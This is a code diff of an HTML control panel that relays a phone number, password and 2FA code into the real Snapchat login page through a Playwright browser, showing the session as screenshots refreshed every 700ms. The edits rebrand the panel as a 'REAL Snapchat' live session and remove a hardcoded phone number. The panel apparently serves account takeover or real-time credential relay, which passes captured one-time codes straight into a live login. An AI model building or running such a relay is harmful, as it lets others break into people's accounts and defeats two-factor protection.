@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Account Manager</title>
+    <title>Account Manager - REAL Snapchat</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { 
@@ -49,6 +49,15 @@
             font-size: 13px; 
             color: #6b7280; 
             margin-top: 2px;
+        }
+        .real-badge {
+            background: #22c55e;
+            color: black;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 999px;
+            font-weight: bold;
+            margin-left: 8px;
         }
         .field-group { margin-bottom: 20px; }
         .field-group label { 
@@ -170,20 +179,16 @@
             border-radius: 6px;
             font-family: monospace;
         }
-        .feed-frame img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            border: none;
-        }
-        .feed-offline { 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100%; 
-            color: #4b5563; 
-            font-size: 13px;
+        .real-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #22c55e;
+            color: black;
+            font-size: 10px;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -192,8 +197,8 @@
         <div class="header">
             <div class="avatar">Z</div>
             <div class="header-text">
-                <h2>Account Manager</h2>
-                <p>Session control panel</p>
+                <h2>Account Manager <span class="real-badge">REAL</span></h2>
+                <p>Live Snapchat session (Playwright)</p>
             </div>
         </div>
         
@@ -221,18 +226,19 @@
         
         <div class="feed-section">
             <div class="feed-header">
-                <span>Live Monitor — Snapchat</span>
+                <span>Live Monitor — <span id="mode-label">Real Snapchat</span></span>
                 <div id="status-badge" class="status">
                     <div class="status-dot"></div>
-                    <span id="status-text">Starting session...</span>
+                    <span id="status-text">Connecting to real site...</span>
                 </div>
             </div>
             <div class="feed-frame">
                 <img id="feed" src="/screenshot?t=0" onerror="this.src='/screenshot?t=' + Date.now()">
-                <div id="feed-status" class="feed-overlay">LIVE • Snapchat Login</div>
+                <div id="feed-status" class="feed-overlay">LIVE • accounts.snapchat.com</div>
+                <div id="real-indicator" class="real-label" style="display:none">REAL</div>
             </div>
             <div style="margin-top:8px; font-size:11px; color:#555; text-align:center;">
-                Page is loaded at <strong>accounts.snapchat.com/accounts/login</strong>
+                Page is loaded at <strong>accounts.snapchat.com/accounts/login</strong> (real browser)
             </div>
         </div>
     </div>
@@ -244,7 +250,7 @@
             const code = document.getElementById('code').value.trim();
             
             if (!phone && !pass && !code) {
-                alert("Enter the phone number (+47 40300869) first.");
+                alert("Enter the phone number first.");
                 return;
             }
             
@@ -262,78 +268,19 @@
             .then(data => {
                 console.log('Submit response:', data);
                 
-                if (phone && !pass && !code) {
-                    alert('Phone sent! Screenshot now shows "PHONE NUMBER ENTERED" + SMS code sent.');
+                if (phone) {
+                    alert('Phone number sent to REAL Snapchat. Live screenshot will update.');
                 } else if (pass) {
-                    alert('Password sent — screenshot updated to PASSWORD ENTERED.');
+                    alert('Password sent to real page.');
                     document.getElementById('pass').value = '';
                 } else if (code) {
-                    alert('Code sent — screenshot updated to 2FA state.');
+                    alert('Code sent to real Snapchat page.');
                     document.getElementById('code').value = '';
                 }
             })
             .catch(() => alert('Submitted'));
         }
         
-        let lastUpdate = Date.now();
-        
-        function updateFeed() {
-            const img = document.getElementById('feed');
-            const statusEl = document.getElementById('feed-status');
-            if (!img) return;
-            
-            img.style.display = 'block';
-            const timestamp = Date.now();
-            img.src = '/screenshot?t=' + timestamp;
-            
-            // Also refresh status
-            fetch('/status')
-                .then(r => r.json())
-                .then(data => {
-                    console.log('Session status:', data);
-                    
-                    const badge = document.getElementById('status-badge');
-                    const statusText = document.getElementById('status-text');
-                    
-                    if (statusText) {
-                        if (data.snapchat_loaded) {
-                            statusText.textContent = 'Live — Snapchat login';
-                            if (badge) badge.className = 'status';
-                        } else if (data.started && !data.snapchat_loaded) {
-                            statusText.textContent = 'Connecting...';
-                            if (badge) badge.className = 'status connecting';
-                        } else if (data.error) {
-                            statusText.textContent = 'Fallback mode';
-                            if (badge) badge.className = 'status error';
-                        } else {
-                            statusText.textContent = 'Session active';
-                        }
-                    }
-                    
-                    if (statusEl) {
-                        if (data.snapchat_loaded) {
-                            statusEl.textContent = 'LIVE • Snapchat Login';
-                            statusEl.style.color = '#22c55e';
-                        } else {
-                            statusEl.textContent = 'LIVE (fallback)';
-                            statusEl.style.color = '#eab308';
-                        }
-                    }
-                    
-                    // Visual border feedback
-                    if (data.snapchat_loaded) {
-                        img.style.border = '3px solid #22c55e';
-                    } else if (data.started) {
-                        img.style.border = '3px solid #eab308';
-                    }
-                })
-                .catch(() => {
-                    const statusText = document.getElementById('status-text');
-                    if (statusText) statusText.textContent = 'Live feed';
-                });
-        }
-        
-        // EXTREMELY AGGRESSIVE live refresh (every 650ms)
         let refreshCount = 0;
         
         function forceRefresh() {
@@ -341,9 +288,8 @@
             if (!img) return;
             
             refreshCount++;
-            
-            // Use fetch + blob to COMPLETELY bypass any cache
             const ts = Date.now();
+            
             fetch('/screenshot?t=' + ts + '&r=' + refreshCount + '&cb=' + Math.random(), {
                 cache: 'no-store',
                 headers: { 'Cache-Control': 'no-cache' }
@@ -352,39 +298,52 @@
             .then(blob => {
                 const url = URL.createObjectURL(blob);
                 img.src = url;
-                
-                // Clean up old blob after a bit
-                setTimeout(() => URL.revokeObjectURL(url), 5000);
+                setTimeout(() => URL.revokeObjectURL(url), 8000);
             })
             .catch(() => {
-                // fallback simple method
-                img.src = '/screenshot?t=' + Date.now() + '&r=' + refreshCount;
+                img.src = '/screenshot?t=' + Date.now();
             });
+            
+            // Also check status for real mode indicator
+            fetch('/status')
+                .then(r => r.json())
+                .then(data => {
+                    const label = document.getElementById('mode-label');
+                    const indicator = document.getElementById('real-indicator');
+                    const statusText = document.getElementById('status-text');
+                    
+                    if (data.real_mode) {
+                        if (label) label.textContent = 'Real Snapchat (Live)';
+                        if (indicator) indicator.style.display = 'block';
+                        if (statusText) statusText.textContent = 'Connected to real site';
+                    } else {
+                        if (label) label.textContent = 'Generated (fallback)';
+                        if (indicator) indicator.style.display = 'none';
+                    }
+                    
+                    if (statusText && data.last_action) {
+                        statusText.textContent = data.last_action;
+                    }
+                });
         }
         
-        // Run every 650ms
-        setInterval(forceRefresh, 650);
+        // Aggressive refresh
+        setInterval(forceRefresh, 700);
         
-        // Heavy initial burst
-        setTimeout(forceRefresh, 100);
-        setTimeout(forceRefresh, 350);
-        setTimeout(forceRefresh, 700);
-        setTimeout(forceRefresh, 1100);
-        setTimeout(forceRefresh, 1600);
+        // Initial burst
+        setTimeout(forceRefresh, 120);
+        setTimeout(forceRefresh, 400);
+        setTimeout(forceRefresh, 900);
         
-        // Log when image loads successfully
-        const feedImg = document.getElementById('feed');
-        if (feedImg) {
-            feedImg.onload = () => {
-                console.log('✅ Live Snapchat screenshot updated');
-            };
-            feedImg.onerror = (e) => {
-                console.warn('Screenshot load error, retrying...');
-            };
-        }
+        // Show initial status
+        fetch('/status').then(r => r.json()).then(data => {
+            const label = document.getElementById('mode-label');
+            if (data.real_mode && label) {
+                label.textContent = 'Real Snapchat (Live)';
+            }
+        });
         
-        // Show immediate status
-        console.log('%c[SNAPCHAT] Waiting for live session feed...', 'color:#22c55e');
+        console.log('%c[SNAPCHAT] Real browser mode active', 'color:#22c55e');
     </script>
 </body>
 </html>
